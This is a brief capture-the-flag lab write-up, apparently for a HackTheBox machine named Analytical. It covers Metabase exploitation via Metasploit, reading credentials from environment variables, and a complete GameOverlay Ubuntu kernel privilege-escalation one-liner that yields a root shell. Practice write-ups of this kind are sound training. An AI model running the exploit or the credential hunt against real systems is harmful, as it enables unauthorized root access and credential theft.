This is a simple box but had some things I didn't check, so it's good to go over.

Start with an nmap scan to find port 80 open. Add `analytical.htb` and `dev.analytical.htb` (the login page) to your `/etc/hosts` to find a **Metabase** page. Go to msfconsole and use the only Metabase exploit. Make sure you use the regular port and put `http://dev.analytical.htb` as your RHOSTS to get a meterpreter session. You can then drop a shell with `/bin/bash -i` to look for creds.

The new part I didn't know about: sometimes there are creds in the **environment variables**. Running `env` gives you creds to `metalytical`.

LinPEAS enumeration didn't work (something I have to work on), but the Ubuntu kernel has a **GameOverlay** exploit which lets you abuse the SUID bits to get root access:

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3; mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```
